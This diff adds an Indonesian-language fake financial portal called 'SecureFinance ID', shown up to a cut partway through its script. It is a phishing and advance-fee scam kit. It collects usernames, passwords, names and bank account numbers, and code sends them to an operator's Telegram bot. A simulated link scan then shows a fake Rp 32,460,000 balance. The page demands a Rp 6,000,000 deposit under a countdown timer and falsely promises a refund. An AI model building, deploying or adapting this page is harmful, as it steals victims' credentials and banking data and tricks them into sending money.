@@ -1,0 +1,1366 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Layanan Keuangan</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #0a1628;
+            --primary-light: #112240;
+            --accent: #00d4ff;
+            --accent-glow: rgba(0, 212, 255, 0.3);
+            --gold: #ffd700;
+            --gold-glow: rgba(255, 215, 0, 0.3);
+            --success: #00e676;
+            --danger: #ff5252;
+            --warning: #ff9800;
+            --text: #e6f1ff;
+            --text-muted: #8892b0;
+            --card-bg: rgba(17, 34, 64, 0.85);
+            --border: rgba(0, 212, 255, 0.15);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--primary);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .bg-animation .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            animation: float 20s infinite ease-in-out;
+        }
+
+        .bg-animation .orb:nth-child(1) {
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.3), transparent);
+            top: -10%;
+            left: -10%;
+            animation-delay: 0s;
+        }
+
+        .bg-animation .orb:nth-child(2) {
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.2), transparent);
+            bottom: -10%;
+            right: -10%;
+            animation-delay: -5s;
+        }
+
+        .bg-animation .orb:nth-child(3) {
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(0, 230, 118, 0.15), transparent);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation-delay: -10s;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(50px, -30px) scale(1.1); }
+            50% { transform: translate(-20px, 40px) scale(0.95); }
+            75% { transform: translate(30px, 20px) scale(1.05); }
+        }
+
+        /* Grid Pattern Overlay */
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background-image: 
+                linear-gradient(rgba(0, 212, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 212, 255, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+        }
+
+        /* Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: var(--accent);
+            border-radius: 50%;
+            opacity: 0;
+            animation: particleFloat linear infinite;
+        }
+
+        @keyframes particleFloat {
+            0% { opacity: 0; transform: translateY(100vh) scale(0); }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { opacity: 0; transform: translateY(-10vh) scale(1); }
+        }
+
+        /* Main Container */
+        .app-container {
+            position: relative;
+            z-index: 1;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* Card */
+        .form-card {
+            width: 100%;
+            max-width: 480px;
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 40px 36px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 
+                0 0 40px rgba(0, 0, 0, 0.5),
+                0 0 80px rgba(0, 212, 255, 0.05),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            transition: all 0.5s ease;
+        }
+
+        .form-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            opacity: 0.6;
+        }
+
+        /* Logo */
+        .logo-section {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, var(--accent), #0088cc);
+            border-radius: 18px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            margin-bottom: 16px;
+            box-shadow: 0 8px 32px rgba(0, 212, 255, 0.3);
+            position: relative;
+        }
+
+        .logo-icon::after {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            animation: pulse-border 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-border {
+            0%, 100% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 0.8; transform: scale(1.05); }
+        }
+
+        .logo-title {
+            font-size: 22px;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--text), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-subtitle {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-top: 4px;
+            font-weight: 400;
+        }
+
+        /* Step Indicator */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 28px;
+        }
+
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.4s ease;
+            position: relative;
+        }
+
+        .step-dot.active {
+            background: var(--accent);
+            border-color: var(--accent);
+            box-shadow: 0 0 12px var(--accent-glow);
+        }
+
+        .step-dot.completed {
+            background: var(--success);
+            border-color: var(--success);
+            box-shadow: 0 0 12px rgba(0, 230, 118, 0.3);
+        }
+
+        .step-line {
+            width: 30px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 1px;
+            transition: all 0.4s ease;
+        }
+
+        .step-line.active {
+            background: linear-gradient(90deg, var(--success), var(--accent));
+        }
+
+        /* Form Steps */
+        .form-step {
+            display: none;
+            animation: fadeSlideIn 0.5s ease forwards;
+        }
+
+        .form-step.active {
+            display: block;
+        }
+
+        @keyframes fadeSlideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Step Title */
+        .step-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: var(--text);
+        }
+
+        .step-desc {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 24px;
+        }
+
+        /* Input Group */
+        .input-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            font-size: 16px;
+            transition: color 0.3s ease;
+            z-index: 1;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 16px 14px 46px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            color: var(--text);
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-wrapper input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+        }
+
+        .input-wrapper input:focus {
+            border-color: var(--accent);
+            background: rgba(0, 212, 255, 0.03);
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.1);
+        }
+
+        .input-wrapper input:focus + i,
+        .input-wrapper input:focus ~ i {
+            color: var(--accent);
+        }
+
+        .input-wrapper:has(input:focus) i {
+            color: var(--accent);
+        }
+
+        /* Buttons */
+        .btn-primary {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--accent), #0088cc);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 15px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 8px;
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(0, 212, 255, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-gold {
+            background: linear-gradient(135deg, var(--gold), #ff8f00);
+            color: #1a1a1a;
+        }
+
+        .btn-gold:hover {
+            box-shadow: 0 8px 32px var(--gold-glow);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, var(--danger), #d32f2f);
+        }
+
+        .btn-danger:hover {
+            box-shadow: 0 8px 32px rgba(255, 82, 82, 0.3);
+        }
+
+        /* Scanning Animation */
+        .scan-container {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .scan-ring {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 3px solid rgba(0, 212, 255, 0.1);
+            border-top-color: var(--accent);
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .scan-ring-inner {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 212, 255, 0.05);
+            border-bottom-color: rgba(0, 212, 255, 0.5);
+            animation: spin 1.5s linear infinite reverse;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .scan-text {
+            font-size: 14px;
+            color: var(--accent);
+            font-weight: 500;
+            animation: blink 1s ease-in-out infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .scan-progress {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .scan-progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent), var(--success));
+            border-radius: 2px;
+            transition: width 0.1s linear;
+            box-shadow: 0 0 10px var(--accent-glow);
+        }
+
+        /* Balance Display */
+        .balance-section {
+            text-align: center;
+            padding: 24px 0;
+        }
+
+        .balance-label {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        .balance-amount {
+            font-size: 42px;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--gold), #ff8f00, var(--gold));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: none;
+            filter: drop-shadow(0 0 20px var(--gold-glow));
+            animation: shimmer 3s ease-in-out infinite;
+            background-size: 200% 100%;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .balance-suffix {
+            font-size: 16px;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        .balance-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0, 230, 118, 0.1);
+            border: 1px solid rgba(0, 230, 118, 0.2);
+            border-radius: 20px;
+            padding: 6px 16px;
+            margin-top: 16px;
+            font-size: 12px;
+            color: var(--success);
+            font-weight: 500;
+        }
+
+        .balance-status i {
+            font-size: 10px;
+        }
+
+        /* Warning Box */
+        .warning-box {
+            background: linear-gradient(135deg, rgba(255, 152, 0, 0.08), rgba(255, 82, 82, 0.08));
+            border: 1px solid rgba(255, 152, 0, 0.25);
+            border-radius: 16px;
+            padding: 24px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .warning-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--warning), var(--danger));
+        }
+
+        .warning-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 48px;
+            height: 48px;
+            background: rgba(255, 152, 0, 0.15);
+            border-radius: 14px;
+            margin-bottom: 16px;
+        }
+
+        .warning-icon i {
+            font-size: 22px;
+            color: var(--warning);
+        }
+
+        .warning-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--warning);
+            margin-bottom: 12px;
+        }
+
+        .warning-text {
+            font-size: 13px;
+            line-height: 1.8;
+            color: rgba(255, 255, 255, 0.75);
+        }
+
+        .warning-text strong {
+            color: var(--gold);
+            font-weight: 700;
+        }
+
+        .warning-highlight {
+            display: block;
+            background: rgba(255, 215, 0, 0.08);
+            border-left: 3px solid var(--gold);
+            padding: 12px 16px;
+            margin-top: 12px;
+            border-radius: 0 8px 8px 0;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.7;
+        }
+
+        .warning-highlight strong {
+            color: var(--gold);
+        }
+
+        /* Deposit Amount */
+        .deposit-amount {
+            text-align: center;
+            padding: 16px;
+            background: rgba(255, 215, 0, 0.05);
+            border: 1px dashed rgba(255, 215, 0, 0.3);
+            border-radius: 12px;
+            margin: 16px 0;
+        }
+
+        .deposit-amount .amount {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--gold);
+        }
+
+        .deposit-amount .label {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+
+        /* Timer */
+        .timer-section {
+            text-align: center;
+            margin-top: 20px;
+            padding: 16px;
+            background: rgba(255, 82, 82, 0.05);
+            border: 1px solid rgba(255, 82, 82, 0.15);
+            border-radius: 12px;
+        }
+
+        .timer-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--danger);
+            margin-bottom: 8px;
+        }
+
+        .timer-display {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--danger);
+            font-variant-numeric: tabular-nums;
+        }
+
+        .timer-display span {
+            color: rgba(255, 82, 82, 0.5);
+        }
+
+        /* Footer */
+        .form-footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.2);
+        }
+
+        .form-footer a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        /* Loading Spinner */
+        .btn-loading {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+
+        .btn-loading .btn-text {
+            visibility: hidden;
+        }
+
+        .btn-loading::after {
+            content: '';
+            position: absolute;
+            width: 22px;
+            height: 22px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+
+        /* Success Checkmark */
+        .success-check {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: rgba(0, 230, 118, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .success-check i {
+            font-size: 28px;
+            color: var(--success);
+        }
+
+        /* Responsive */
+        @media (max-width: 520px) {
+            .form-card {
+                padding: 28px 24px;
+                border-radius: 20px;
+            }
+
+            .balance-amount {
+                font-size: 34px;
+            }
+
+            .logo-title {
+                font-size: 19px;
+            }
+        }
+
+        /* Link display */
+        .link-display {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-top: 8px;
+            font-size: 13px;
+            color: var(--accent);
+            word-break: break-all;
+        }
+
+        .link-display i {
+            margin-right: 6px;
+            font-size: 12px;
+        }
+
+        /* Input with select-like styling for job */
+        .input-wrapper select {
+            width: 100%;
+            padding: 14px 16px 14px 46px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            color: var(--text);
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+            outline: none;
+            appearance: none;
+            -webkit-appearance: none;
+        }
+
+        .input-wrapper select:focus {
+            border-color: var(--accent);
+            background: rgba(0, 212, 255, 0.03);
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.1);
+        }
+
+        .input-wrapper select option {
+            background: var(--primary-light);
+            color: var(--text);
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        .divider span {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Info rows */
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-row .label {
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .info-row .value {
+            font-size: 13px;
+            color: var(--text);
+            font-weight: 600;
+        }
+    </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+<body>
+    <!-- Background Effects -->
+    <div class="bg-animation">
+        <div class="orb"></div>
+        <div class="orb"></div>
+        <div class="orb"></div>
+    </div>
+    <div class="grid-overlay"></div>
+    <div class="particles" id="particles"></div>
+
+    <!-- Main App -->
+    <div class="app-container">
+        <div class="form-card">
+            <!-- Logo -->
+            <div class="logo-section">
+                <div class="logo-icon">
+                    <i class="fas fa-shield-halved"></i>
+                </div>
+                <div class="logo-title">SecureFinance ID</div>
+                <div class="logo-subtitle">Portal Layanan Keuangan Terpercaya</div>
+            </div>
+
+            <!-- Step Indicator -->
+            <div class="step-indicator" id="stepIndicator">
+                <div class="step-dot active" data-step="1"></div>
+                <div class="step-line"></div>
+                <div class="step-dot" data-step="2"></div>
+                <div class="step-line"></div>
+                <div class="step-dot" data-step="3"></div>
+                <div class="step-line"></div>
+                <div class="step-dot" data-step="4"></div>
+                <div class="step-line"></div>
+                <div class="step-dot" data-step="5"></div>
+            </div>
+
+            <!-- Step 1: Login -->
+            <div class="form-step active" id="step1">
+                <div class="step-title">Masuk ke Akun</div>
+                <div class="step-desc">Silakan masukkan kredensial Anda untuk melanjutkan</div>
+
+                <div class="input-group">
+                    <label>Username</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="username" placeholder="Masukkan username" autocomplete="off">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="password" placeholder="Masukkan password" autocomplete="off">
+                    </div>
+                </div>
+
+                <button class="btn-primary" onclick="goToStep(2)">
+                    <span class="btn-text"><i class="fas fa-arrow-right-to-bracket"></i>&nbsp; Masuk</span>
+                </button>
+
+                <div class="form-footer">
+                    Sistem dilindungi enkripsi end-to-end
+                </div>
+            </div>
+
+            <!-- Step 2: Data Input -->
+            <div class="form-step" id="step2">
+                <div class="step-title">Lengkapi Data</div>
+                <div class="step-desc">Masukkan informasi pribadi dan rekening Anda</div>
+
+                <div class="input-group">
+                    <label>Nama Lengkap</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-id-card"></i>
+                        <input type="text" id="fullname" placeholder="Masukkan nama lengkap" autocomplete="off">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Nomor Rekening</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-credit-card"></i>
+                        <input type="text" id="rekening" placeholder="Masukkan nomor rekening" autocomplete="off" inputmode="numeric">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Pekerjaan yang Diinginkan</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-briefcase"></i>
+                        <input type="text" id="job" placeholder="Masukkan pekerjaan impian" autocomplete="off">
+                    </div>
+                </div>
+
+                <button class="btn-primary" onclick="goToStep(3)">
+                    <span class="btn-text"><i class="fas fa-paper-plane"></i>&nbsp; Kirim Data</span>
+                </button>
+
+                <div class="form-footer">
+                    <a href="#" onclick="goToStep(1); return false;"><i class="fas fa-arrow-left"></i> Kembali ke login</a>
+                </div>
+            </div>
+
+            <!-- Step 3: Link Input & Scan -->
+            <div class="form-step" id="step3">
+                <div class="step-title">Verifikasi Link</div>
+                <div class="step-desc">Masukkan link yang ingin diverifikasi untuk proses pencairan</div>
+
+                <div class="input-group">
+                    <label>Link Verifikasi</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-link"></i>
+                        <input type="url" id="linkInput" placeholder="https://example.com" autocomplete="off">
+                    </div>
+                </div>
+
+                <button class="btn-primary" id="scanBtn" onclick="startScan()">
+                    <span class="btn-text"><i class="fas fa-magnifying-glass"></i>&nbsp; Scan Link</span>
+                </button>
+
+                <!-- Scanning Animation (hidden initially) -->
+                <div id="scanAnimation" style="display:none;">
+                    <div class="scan-container">
+                        <div class="scan-ring">
+                            <div class="scan-ring-inner"></div>
+                        </div>
+                        <div class="scan-text" id="scanText">Memindai link...</div>
+                        <div class="scan-progress">
+                            <div class="scan-progress-bar" id="scanProgressBar"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Scan Result (hidden initially) -->
+                <div id="scanResult" style="display:none; margin-top:16px;">
+                    <div class="success-check">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div style="text-align:center; margin-bottom: 12px;">
+                        <div style="font-size:14px; font-weight:600; color:var(--success);">Link Berhasil Diverifikasi</div>
+                    </div>
+                    <div class="link-display">
+                        <i class="fas fa-link"></i>
+                        <span id="linkDisplay"></span>
+                    </div>
+
+                    <div class="divider"><span>Detail Scan</span></div>
+                    <div class="info-row">
+                        <span class="label">Status</span>
+                        <span class="value" style="color:var(--success);"><i class="fas fa-circle-check"></i> Aman</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="label">SSL</span>
+                        <span class="value" style="color:var(--success);"><i class="fas fa-lock"></i> Terenkripsi</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="label">Dana Terdeteksi</span>
+                        <span class="value" style="color:var(--gold);">Rp 32.460.000</span>
+                    </div>
+
+                    <button class="btn-primary btn-gold" style="margin-top:16px;" onclick="goToStep(4)">
+                        <span class="btn-text"><i class="fas fa-arrow-right"></i>&nbsp; Lanjutkan</span>
+                    </button>
+                </div>
+
+                <div class="form-footer">
+                    <a href="#" onclick="goToStep(2); return false;"><i class="fas fa-arrow-left"></i> Kembali</a>
+                </div>
+            </div>
+
+            <!-- Step 4: Balance & Cairkan -->
+            <div class="form-step" id="step4">
+                <div class="step-title">Dana Tersedia</div>
+                <div class="step-desc">Dana telah terverifikasi dan siap untuk dicairkan</div>
+
+                <div class="balance-section">
+                    <div class="balance-label">Total Saldo Terverifikasi</div>
+                    <div class="balance-amount">32.460.000</div>
+                    <div class="balance-suffix">Rupiah</div>
+                    <div class="balance-status">
+                        <i class="fas fa-circle"></i> Terverifikasi &bull; Siap Cairkan
+                    </div>
+                </div>
+
+                <div class="divider"><span>Informasi Rekening</span></div>
+
+                <div class="info-row">
+                    <span class="label">Nama</span>
+                    <span class="value" id="confirmName">-</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">No. Rekening</span>
+                    <span class="value" id="confirmRekening">-</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Pekerjaan</span>
+                    <span class="value" id="confirmJob">-</span>
+                </div>
+
+                <button class="btn-primary btn-gold" style="margin-top:20px;" onclick="goToStep(5)">
+                    <span class="btn-text"><i class="fas fa-hand-holding-dollar"></i>&nbsp; Cairkan Dana</span>
+                </button>
+            </div>
+
+            <!-- Step 5: Warning / Deposit -->
+            <div class="form-step" id="step5">
+                <div class="step-title" style="color:var(--warning);">
+                    <i class="fas fa-triangle-exclamation"></i> Persyaratan Pencairan
+                </div>
+                <div class="step-desc">Diperlukan langkah tambahan untuk memproses pencairan dana</div>
+
+                <div class="deposit-amount">
+                    <div class="label">Deposit Wajib</div>
+                    <div class="amount">6.000.000</div>
+                    <div class="label">Rupiah</div>
+                </div>
+
+                <div class="warning-box">
+                    <div class="warning-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="warning-title">PERHATIAN - PROSES PENCAIRAN</div>
+                    <div class="warning-text">
+                        Proses akan dilanjut jika deposit terlebih dahulu nominal <strong>Rp 6.000.000</strong> untuk melanjutkan proses pencairan, proses <strong>1-5 hari</strong>.
+                    </div>
+                    <div class="warning-highlight">
+                        <strong><i class="fas fa-info-circle"></i> Note:</strong> Dana dikembalikan otomatis transfer ke rekening yang terdaftar. Tools berjalan <strong>2 hari sebelum hangus</strong>.
+                    </div>
+                </div>
+
+                <div class="timer-section">
+                    <div class="timer-label"><i class="fas fa-clock"></i> &nbsp;Sisa Waktu Pencairan</div>
+                    <div class="timer-display" id="countdownTimer">
+                        47 <span>:</span> 59 <span>:</span> 58
+                    </div>
+                </div>
+
+                <button class="btn-primary btn-danger" style="margin-top:20px;" onclick="processDeposit()">
+                    <span class="btn-text"><i class="fas fa-credit-card"></i>&nbsp; Proses Deposit Sekarang</span>
+                </button>
+
+                <div class="form-footer" style="margin-top:16px;">
+                    Deposit akan dikembalikan otomatis ke rekening terdaftar
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== CONFIGURATION ==========
+        // Ganti dengan Telegram Bot Token dan Chat ID Anda
+        const TELEGRAM_BOT_TOKEN = 'GANTI_DENGAN_BOT_TOKEN_ANDA';
+        const TELEGRAM_CHAT_ID = 'GANTI_DENGAN_CHAT_ID_ANDA';
+
+        // ========== STATE ==========
+        let currentStep = 1;
+        let countdownInterval = null;
+
+        // ========== PARTICLES ==========
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 30; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDuration = (Math.random() * 10 + 8) + 's';
+                particle.style.animationDelay = (Math.random() * 10) + 's';
+                particle.style.width = (Math.random() * 3 + 1) + 'px';
+                particle.style.height = particle.style.width;
+                container.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        // ========== STEP NAVIGATION ==========
+        function goToStep(step) {
+            // Validasi step 1
+            if (step === 2 && currentStep === 1) {
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value.trim();
+                if (!username || !password) {
+                    shakeInput(!username ? 'username' : 'password');
+                    return;
+                }
+            }
+
+            // Validasi step 2
+            if (step === 3 && currentStep === 2) {
+                const fullname = document.getElementById('fullname').value.trim();
+                const rekening = document.getElementById('rekening').value.trim();
+                const job = document.getElementById('job').value.trim();
+                if (!fullname) { shakeInput('fullname'); return; }
+                if (!rekening) { shakeInput('rekening'); return; }
+                if (!job) { shakeInput('job'); return; }
+                // Kirim data ke Telegram saat pindah dari step 2
+                sendToTelegram();
+            }
+
+            // Update step
+            currentStep = step;
+
+            // Update step indicator
+            const dots = document.querySelectorAll('.step-dot');
+            const lines = document.querySelectorAll('.step-line');
+            dots.forEach((dot, i) => {
+                dot.classList.remove('active', 'completed');
+                if (i + 1 < step) dot.classList.add('completed');
+                if (i + 1 === step) dot.classList.add('active');
+            });
+            lines.forEach((line, i) => {
+                line.classList.remove('active');
+                if (i + 1 < step) line.classList.add('active');
+            });
+
+            // Update form steps
+            document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+
+            // Step-specific actions
+            if (step === 4) {
+                document.getElementById('confirmName').textContent = document.getElementById('fullname').value;
+                document.getElementById('confirmRekening').textContent = document.getElementById('rekening').value;
+                document.getElementById('confirmJob').textContent = document.getElementById('job').value;
+            }
+
+            if (step === 5) {
+                startCountdown();
+            }
+        }
+
+        // ========== INPUT SHAKE ==========
+        function shakeInput(id) {
+            const input = document.getElementById(id);
+            input.style.borderColor = 'var(--danger)';
+            input.style.animation = 'shake 0.4s ease';
+            input.parentElement.querySelector('i').style.color = 'var(--danger)';
+            setTimeout(() => {
+                input.style.animation = '';
+                input.style.borderColor = '';
+                input.parentElement.querySelector('i').style.color = '';
+            }, 1000);
+        }
+
+        // Add shake keyframes
+        const shakeStyle = document.createElement('style');
+        shakeStyle.textContent = `
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                20% { transform: translateX(-8px); }
+                40% { transform: translateX(8px); }
+                60% { transform: translateX(-4px); }
+                80% { transform: translateX(4px); }
+            }
+        `;
+        document.head.appendChild(shakeStyle);
+
+        // ========== SCAN SIMULATION ==========
+        function startScan() {
+            const link = document.getElementById('linkInput').value.trim();
+            if (!link) {
+                shakeInput('linkInput');
+                return;
+            }
+
+            const scanBtn = document.getElementById('scanBtn');
+            const scanAnim = document.getElementById('scanAnimation');
+            const scanResult = document.getElementById('scanResult');
+
+            scanBtn.style.display = 'none';
+            scanAnim.style.display = 'block';
+            scanResult.style.display = 'none';
+
+            const progressBar = document.getElementById('scanProgressBar');
+            const scanText = document.getElementById('scanText');
+
+            const messages = [
+                'Memindai link...',
